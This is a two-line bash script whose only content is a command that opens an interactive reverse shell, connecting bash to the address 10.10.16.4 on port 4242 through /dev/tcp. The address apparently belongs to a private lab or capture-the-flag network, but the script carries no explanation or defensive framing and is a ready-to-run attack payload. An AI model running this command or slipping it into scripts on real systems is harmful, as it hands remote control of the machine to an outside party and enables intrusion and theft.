#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.4/4242 0>&1'
